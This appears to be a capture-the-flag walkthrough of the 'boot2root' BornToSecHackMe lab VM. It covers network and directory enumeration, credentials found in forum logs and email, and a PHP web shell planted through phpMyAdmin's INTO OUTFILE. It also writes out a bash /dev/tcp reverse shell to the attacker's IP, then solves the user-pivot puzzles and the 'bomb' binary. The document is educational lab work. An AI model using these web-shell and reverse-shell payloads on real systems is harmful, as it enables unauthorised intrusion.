# How to find the IP of the VM ?

We know that the VM is connected through the network interface `enp0s31f6`.

```
nlederge@k0r3p13:~ $ ip a         
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s31f6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether d0:46:0c:85:a3:95 brd ff:ff:ff:ff:ff:ff
    inet 10.11.3.13/16 brd 10.11.255.255 scope global dynamic noprefixroute enp0s31f6
       valid_lft 4253sec preferred_lft 4253sec
    inet6 fe80::baef:a725:fbe8:c5dc/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: wlp0s20f3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether a8:59:5f:cb:72:99 brd ff:ff:ff:ff:ff:ff
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 12:8b:77:1a:96:9e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: vboxnet0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
```

The IP of the VM will be in the subnet `10.11.3.13/16`. We could scan with nmap the entire subnet to find the VM but we know that VirtualBox machines usually take an IP at the end of the subnet.

```
nlederge@k0r3p13:~ $ nmap -sn 10.11.250-254.0-254
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:51 +0200
Nmap scan report for 10.11.250.230
Host is up (0.00030s latency).
Nmap scan report for 10.11.250.250
Host is up (0.0041s latency).
Nmap scan report for _gateway (10.11.254.254)
Host is up (0.00038s latency).
Nmap done: 1275 IP addresses (3 hosts up) scanned in 33.16 seconds
```

We have two potential candidates: `10.11.250.230` and `10.11.250.250`. Let's see which ports are open.

```
nlederge@k0r3p13:~ $ nmap 10.11.250.230 10.11.250.250
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:53 +0200
Nmap scan report for 10.11.250.230
Host is up (0.000027s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap scan report for 10.11.250.250
Host is up (0.0019s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
4321/tcp open  rwhois
7000/tcp open  afs3-fileserver
7100/tcp open  font-service
7435/tcp open  unknown
8008/tcp open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 2 IP addresses (2 hosts up) scanned in 1.06 seconds
```

By opening the `10.11.250.230` in a browser, we can see that it is a web server asking to hack it, confirming our hypothesis.

# Getting a shell on the server

With `gobuster` we can try to find directories and files on the server.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u 10.11.250.230 -w ~/SecLists/Discovery/Web-Content/common.txt                    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 290]
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
cgi-bin/             (Status: 403) [Size: 289]
fonts                (Status: 301) [Size: 314] [--> http://10.11.250.230/fonts/]
forum                (Status: 403) [Size: 286]
index.html           (Status: 200) [Size: 1025]
server-status        (Status: 403) [Size: 294]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The route `forum` is interesting but we get a forbidden access. By using our browser and ignoring the expired TLS certificate, we can access it `https://10.11.250.230/forum`.
We can try again with gobuster but now by ignoring the invalid certificates.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u https://10.11.250.230 -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
cgi-bin/             (Status: 403) [Size: 290]
forum                (Status: 301) [Size: 316] [--> https://10.11.250.230/forum/]
phpmyadmin           (Status: 301) [Size: 321] [--> https://10.11.250.230/phpmyadmin/]
server-status        (Status: 403) [Size: 295]
webmail              (Status: 301) [Size: 318] [--> https://10.11.250.230/webmail/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

It gives us a few interesting directories : `forum`, `phpmyadmin`, `webmail`. `phpmyadmin` and `webmail` ask for credentials, `forum` doesn't.

By browsing the `forum`, we can see that there are multiple posts and specifically one about `Probleme login ?` posted by `lmezard` posting a lot of logs.
There a useful information in the logs :
- The server hostname `BornToSecHackMe` is revealed.
- `lmezard` is a valid user account and scheduled cron jobs.
- `admin` is also a valid account and has sudo access.
- The string `!q\]Ej?*5K5cy*AJ` is entered in the login field, probably an accidental pasted string.

We can login to the forum with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`. When trying to send an email to the admin account, our mail appears as the sender email `laurie@borntosec.net`. We can login to the webmail with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`.

An email sent by `qudevide` to `lmezard` says :

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

With these credentials `root` : `Fg-'kKXBj87E:aJ$`, we can login to the phpmyadmin database and see the databases.
We can execute SQL queries to create files on the server, let's try to create a shell.php file in the forum directory to try to create a reverse shell. The issue is that we can't write directly in the '/var/www/forum' directory, we need to find another directory to write the file.

Let's enumerate the subdirectories with `gobuster`.
```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ gobuster dir -u https://10.11.250.230/forum/ -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230/forum/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
backup               (Status: 403) [Size: 294]
config               (Status: 403) [Size: 294]
images               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/images/]
includes             (Status: 301) [Size: 325] [--> https://10.11.250.230/forum/includes/]
js                   (Status: 301) [Size: 319] [--> https://10.11.250.230/forum/js/]
lang                 (Status: 301) [Size: 321] [--> https://10.11.250.230/forum/lang/]
modules              (Status: 301) [Size: 324] [--> https://10.11.250.230/forum/modules/]
index.php            (Status: 200) [Size: 4935]
index                (Status: 200) [Size: 4935]
templates_c          (Status: 301) [Size: 328] [--> https://10.11.250.230/forum/templates_c/]
themes               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/themes/]
update               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/update/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

After trying all the possible directories, we can write the shell.php file in the `templates_c` directory, phpmyadmin gives us a successful response.
```
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

We can now access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=id`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's start a reverse shell with bash. We need to execute the following command in the server : `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` as `10.11.3.13` is our IP and `4444` is the port we will use to receive the shell. For it to pass it trough the php script, we need to use the `?c=` parameter and URL encode the command.

We pass `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` to a website like `www.urlencoder.org` and we get the encoded command. Our payload will be `?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We will be using `penelope` to have a fully functionnal and interactive reverse shell.

```
git clone https://github.com/brightio/penelope.git
cd penelope
chmod +x penelope.py
```

And we launch it with the following command : `python3 penelope.py -p 4444`. Then we access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We have our shell :

```
nlederge@k0r3p13:work/penelope ‹main›$ python3 penelope.py 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.11.3.13 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from BornToSecHackMe~10.11.250.230-Linux-i686 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/nlederge/.penelope/sessions/BornToSecHackMe~10.11.250.230-Linux-i686/2025_10_15-17_24_57-715.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

# Following the breadcrumbs

In the directory `/home`, there is a directory `LOOKATME` which contains a file password.

```
www-data@BornToSecHackMe:/home$ cat /home/LOOKATME/password 
lmezard:G!@M6f4Eatau{sF"
```

With these credentials `lmezard` : `G!@M6f4Eatau{sF"`, we can login to the user `lmezard` with the following command : `su lmezard`.

```
www-data@BornToSecHackMe:/home$ su lmezard
Password: 
lmezard@BornToSecHackMe:~$ id
uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
lmezard@BornToSecHackMe:~$
```

## lmezard's fun

In the home directory there is a `README` file which contains this text referencing the file `fun`.

```
lmezard@BornToSecHackMe:~$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way. We can use the `ftp` service with the credentials `lmezard` : `G!@M6f4Eatau{sF"` to download the file `fun`.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ftp 10.11.250.230
Connected to 10.11.250.230.
220 Welcome on this server
Name (10.11.250.230:nlederge): lmezard
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6216|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||59534|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***********************************|   790 KiB  163.41 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (153.40 MiB/s)
ftp> exit
221 Goodbye.
```

We can then unpack the file `fun` and see the `pcap` files.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ tar -xvf fun     
ft_fun/
ft_fun/C4D03.pcap
ft_fun/GKGEP.pcap
ft_fun/A5GPY.pcap
ft_fun/K8SEB.pcap
ft_fun/PFG98.pcap
ft_fun/U89WD.pcap
...
```

Each `pcap` file contains part of a `c` program. We can concatenate them all to get the complete program following the comments indicating the order of the files, i.e. `//file443`.
For this, we will use our script `concatenate_fun.py`, compile the program and run it to get the password.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ python3 scripts/concatenate_fun.py
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ cc combined_fun.c && ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

It asks us to SHA-256 the password before submitting it.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ echo -n Iheartpwnage | sha256sum 
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

Now we can ssh to `laurie` with the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ssh laurie@10.11.250.230
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@10.11.250.230's password: 
laurie@BornToSecHackMe:~$ id
uid=1003(laurie) gid=1003(laurie) groups=1003(laurie)
```

## laurie's bomb

Inside laurie's home directory, there are two files : a binary `bomb` and a file `README` giving hints on how to use it.
```
laurie@BornToSecHackMe:~$ ls
README  bomb
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The `bomb` asks us to diffuse it by providing correct informations to pass the 6 different stages.

```
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

BOOM!!!
The bomb has blown up.
```

Let's `scp laurie@10.11.250.230:~/bomb .` the `bomb` file to our machine with the credentials `laurie` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` and open it with `binaryninja`.

The main function either takes a file as argument or stdin. It then calls the phase functions in order.
```
080489b0    int32_t main(int32_t argc, char** argv, char** envp)
080489c0        void* const var_28
080489c0        
080489c0        if (argc != 1)
080489d3            if (argc != 2)
08048a1b                printf(format: "Usage: %s [<input_file>]\n", *argv)
08048a25                exit(status: 8)
08048a25                noreturn
08048a25            
080489d8            var_28 = &data_8049620
080489e1            FILE* eax_2 = fopen(filename: argv[1], mode: u"r…")
080489e6            infile = eax_2
080489e6            
080489f0            if (eax_2 == 0)
08048a01                printf(format: "%s: Error: Couldn't open %s\n", *argv, argv[1])
08048a0b                exit(status: 8)
08048a0b                noreturn
080489c0        else
080489c7            infile = stdin
080489c7        
08048a30        initialize_bomb()
08048a3d        printf(format: "Welcome this is my little bomb !…", var_28)
08048a4a        printf(format: "only one life good luck !! Have …")
08048a5b        phase_1(read_line())
08048a60        phase_defused()
08048a6d        printf(format: "Phase 1 defused. How about the n…")
08048a7e        phase_2(read_line())
08048a83        phase_defused()
08048a90        printf(format: "That's number 2.  Keep going!\n")
08048aa1        phase_3(read_line())
08048aa6        phase_defused()
08048ab3        printf(format: "Halfway there!\n")
08048ac4        phase_4(read_line())
08048ac9        phase_defused()
08048ad6        printf(format: "So you got that one.  Try this o…")
08048ae7        phase_5(read_line())
08048aec        phase_defused()
08048af9        printf(format: "Good work!  On to the next...\n")
08048b0a        phase_6(read_line())
08048b0f        phase_defused()
08048b1c        return 0
```

The `phase_1` function compares the input with the string `Public speaking is very easy.` and explodes the bomb if they are not equal.
Therefore, the first line of the solutions will be `Public speaking is very easy.`.

```
08048b20    int32_t phase_1(char* arg1)
08048b32        int32_t result = strings_not_equal(arg1, "Public speaking is very easy.")
08048b32        
08048b3c        if (result == 0)
08048b46            return result
08048b46        
08048b3e        explode_bomb()
08048b3e        noreturn
```

The `phase_2` function reads 6 numbers from the input. If the first number is not 1, it explodes the bomb. It then compares successively the numbers according to the formula `number[i] = (i + 1) * number[i-1]`. Therefore, the second line of the solutions will be `1 2 6 24 120 720`.

```
08048b48    int32_t phase_2(char* arg1)
08048b5b        int32_t var_1c[0x6]
08048b5b        read_six_numbers(arg1, &var_1c)
08048b5b        
08048b67        if (var_1c[0] != 1)
08048b69            explode_bomb()
08048b69            noreturn
08048b69        
08048b8c        int32_t result
08048b8c        
08048b8c        for (int32_t i = 1; i s<= 5; i += 1)
08048b79            void var_20
08048b79            result = (i + 1) * *(&var_20 + (i << 2))
08048b79            
08048b81            if (var_1c[i] != result)
08048b83                explode_bomb()
08048b83                noreturn
08048b83        
08048b96        return result
```

The `phase_3` function reads an integer, a character and an integer called here `result_1`, `c` and `i`.
If `result_1` is greater than 7, it explodes the bomb. Otherwise, it switches on `result_1` and compares `i` with the expected value. If it is not equal, it explodes the bomb.
At the end of the function it compares `c` with the value of `ebx.b`. If they are not equal, it explodes the bomb. The value of `ebx.b` is determined by the switch statement.
An valid solution would be `0 q 777` but according to the hint, the character must be a `b`. Therefore, we will be using the second switch statement and the third line of the solutions will be `1 b 214`.

```
08048b98    int32_t phase_3(char* arg1)
08048bc2        int32_t result_1
08048bc2        char c
08048bc2        int32_t i
08048bc2        
08048bc2        if (sscanf(s: arg1, format: "%d %c %d", &result_1, &c, &i) s<= 2)
08048bc4            explode_bomb()
08048bc4            noreturn
08048bc4        
08048bcd        int32_t ebx
08048bcd        
08048bcd        if (result_1 u> 7)
08048c88            ebx.b = 0x78
08048c8a            explode_bomb()
08048c8a            noreturn
08048c8a        
08048bd3        int32_t result = result_1
08048bd3        
08048bd6        switch (result)
08048be0            case 0
08048be0                ebx.b = 0x71
08048be0                
08048be9                if (i != 0x309)
08048bef                    explode_bomb()
08048bef                    noreturn
08048c00            case 1
08048c00                ebx.b = 0x62
08048c00                
08048c09                if (i != 0xd6)
08048c0f                    explode_bomb()
08048c0f                    noreturn
08048c16            case 2
08048c16                ebx.b = 0x62
08048c16                
08048c1f                if (i != 0x2f3)
08048c21                    explode_bomb()
08048c21                    noreturn
08048c28            case 3
08048c28                ebx.b = 0x6b
08048c28                
08048c31                if (i != 0xfb)
08048c33                    explode_bomb()
08048c33                    noreturn
08048c40            case 4
08048c40                ebx.b = 0x6f
08048c40                
08048c49                if (i != 0xa0)
08048c4b                    explode_bomb()
08048c4b                    noreturn
08048c52            case 5
08048c52                ebx.b = 0x74
08048c52                
08048c5b                if (i != 0x1ca)
08048c5d                    explode_bomb()
08048c5d                    noreturn
08048c64            case 6
08048c64                ebx.b = 0x76
08048c64                
08048c6d                if (i != 0x30c)
08048c6f                    explode_bomb()
08048c6f                    noreturn
08048c76            case 7
08048c76                ebx.b = 0x62
08048c76                
08048c7f                if (i != 0x20c)
08048c81                    explode_bomb()
08048c81                    noreturn
08048c81        
08048c92        if (ebx.b == c)
08048c9f            return result
08048c9f        
08048c94        explode_bomb()
08048c94        noreturn
```

The `phase_4` function reads an integer and calls the `func4` function. If the result is not 55 (0x37), it explodes the bomb. The `func4` function is a recursive function that returns the n-th Fibonacci number. Therefore, the solution will be `9`.

```
08048ca0    int32_t func4(int32_t arg1)
08048cae        if (arg1 s<= 1)
08048cd0            return 1
08048cd0        
08048cb7        int32_t eax_1 = func4(arg1 - 1)
08048cca        return func4(arg1 - 2) + eax_1


08048ce0    int32_t phase_4(char* arg1)
08048d07        int32_t var_8
08048d07        
08048d07        if (sscanf(s: arg1, format: "%d", &var_8) != 1 || var_8 s<= 0)
08048d09            explode_bomb()
08048d09            noreturn
08048d09        
08048d15        int32_t result = func4(var_8)
08048d15        
08048d20        if (result == 0x37)
08048d2a            return result
08048d2a        
08048d22        explode_bomb()
08048d22        noreturn
```

The `phase_5` function reads a stripekmqng of exactly 6 characters and loop on it and uses a bitwise `AND` mask of `0xf` (15) to get the index of the new character in the string `isrveawhobpnutfg`. Then it compares the resulting string with the string `giants`. Therefore the solution will be `opekmq`.

```
  0110 1111  ('o')
& 0000 1111  (0xf)
-----------
  0000 1111  = 15 (decimal) = 0xF (hex)
-> string[15] = 'g'
```

Any character whose lower 4 bits equal 15 will work for getting the first letter `g`. For example `?` is also valid because its binary representation is `0011 1111`. But if we look at our HINT, we can see that the first character must be a `o`. That's why we will be using alphabetical characters for the rest.

```
08048d2c    int32_t phase_5(char* arg1)
08048d46        if (string_length(arg1) != 6)
08048d48            explode_bomb()
08048d48            noreturn
08048d48        
08048d69        char var_c[0x6]
08048d69        
08048d69        for (char* i = nullptr; i s<= 5; i = &i[1])
08048d57            int32_t eax
08048d57            eax.b = *(i + arg1)
08048d5a            eax.b &= 0xf
08048d5f            eax.b = (*"isrveawhobpnutfg")[sx.d(eax.b)]
08048d62            *(i + &var_c) = eax.b
08048d62        
08048d6b        char var_6 = 0
08048d7b        int32_t result = strings_not_equal(&var_c, "giants")
08048d7b        
08048d85        if (result == 0)
08048d94            return result
08048d94        
08048d87        explode_bomb()
08048d87        noreturn
```

The `phase_6` takes a string of 6 int and check if their values are between 1 and 6 and if they are not duplicates. Then it will create a linked list from node 1 to 6 and check if the value of each element in the list is in a decreasing order. So we need to find the value of each node, so then we can rearrange them in a decreasing order.

```
$ objdump -t bomb | grep node
0804b230 g     O .data	0000000c              node6
0804b254 g     O .data	0000000c              node3
0804b23c g     O .data	0000000c              node5
0804b248 g     O .data	0000000c              node4
0804b26c g     O .data	0000000c              node1
0804b260 g     O .data	0000000c              node2
```

```
$ gdb -q bomb
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from bomb...
gef➤  x/3wx 0x0804b230
0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000
gef➤  x/3wx 0x0804b26c
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
gef➤  x/3wx 0x0804b254
0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b248
gef➤  x/3wx 0x0804b23c
0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230
gef➤  x/3wx 0x0804b248
0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b23c
gef➤  x/3wx 0x0804b26c
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
gef➤  x/3wx 0x0804b260
0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254
```

```
node1 -> 253
node2 -> 725
node3 -> 301
node4 -> 997
node5 -> 212
node6 -> 432
```

We just need to rearrange them in a decreasing order.
```
997 (node4) → 725 (node2) → 432 (node6) → 301 (node3) → 253 (node1) → 212 (node5)
```

So out solution for that phase will be `4 2 6 3 1 5`.


```
08048d98    int32_t phase_6(char* arg1)
08048d9f        int32_t (* esi)[0x6]
08048d9f        int32_t (* var_58)[0x6] = esi
08048db3        int32_t var_1c[0x6]
08048db3        read_six_numbers(arg1, &var_1c)
08048db3        
08048e00        for (int32_t i = 0; i s<= 5; i += 1)
08048dca            if (var_1c[i] - 1 u> 5)
08048dcc                explode_bomb()
08048dcc                noreturn
08048dcc            
08048dd7            for (int32_t j = i + 1; j s<= 5; j += 1)
08048def                if (var_1c[i] == var_1c[j])
08048df1                    explode_bomb()
08048df1                    noreturn
08048df1        
08048e42        int32_t var_34[0x6]
08048e42        
08048e42        for (int32_t i_1 = 0; i_1 s<= 5; i_1 += 1)
08048e10            void* esi_3 = &node1
08048e13            int32_t j_1 = 1
08048e13            
08048e24            if (1 s< var_1c[i_1])
08048e29                esi_3 = &node1
08048e29                
08048e36                do
08048e30                    esi_3 = *(esi_3 + 8)
08048e33                    j_1 += 1
08048e36                while (j_1 s< var_1c[i_1])
08048e36            
08048e3b            var_34[i_1] = esi_3
08048e3b        
08048e44        int32_t* esi_4 = var_34[0]
08048e47        int32_t* var_38 = esi_4
08048e47        
08048e5e        for (int32_t i_2 = 1; i_2 s<= 5; i_2 += 1)
08048e52            int32_t* eax_7 = var_34[i_2]
08048e55            esi_4[2] = eax_7
08048e58            esi_4 = eax_7
08048e58        
08048e60        esi_4[2] = 0
08048e6a        int32_t i_3 = 0
08048e6c        int32_t* esi_6 = var_38
08048e85        int32_t result
08048e85        
08048e85        do
08048e73            result = *esi_6
08048e73            
08048e77            if (result s< *esi_6[2])
08048e79                explode_bomb()
08048e79                noreturn
08048e79            
08048e7e            esi_6 = esi_6[2]
08048e81            i_3 += 1
08048e85        while (i_3 s<= 4)
08048e85        
08048e90        return result
```

If we put all of our solutions at once, we can defuse the bomb :

```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

Nevertheless, that doesnt give us the password for the next user. So we need refer back to the `README` file.
So the "thor" password will be `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
According to the subject we need to swap '1' with '3' `For the part related to a (bin) bomb: If the password found is 123456. The password to use is 123546.`.
So the final password will be `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

```
laurie@BornToSecHackMe:~$ su thor
Password: 
thor@BornToSecHackMe:~$ id
uid=1004(thor) gid=1004(thor) groups=1004(thor)
```

# zaz's turtle

The home directory of the "zaz" user contains a file `turtle` that contains a sequence of commands to move a turtle on a grid.

```
thor@BornToSecHackMe:~$ ls
README  turtle
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$ cat turtle 
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
...
```

We can `scp thor@10.11.250.230:~/turtle .` to get the file.
Then we can run the file with `python3 scripts/run_turtle.py`.
It draws the letter `SLASH` on the screen, it doesn't work but the MD5 of `SLASH` does, because why would it be indicated ?

```
$ echo -n SLASH | md5sum           
646da671ca01bb5d84dbb5fb2238dc8e  -
```

So the password for the `zaz` user is `646da671ca01bb5d84dbb5fb2238dc8e`.

```
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
```
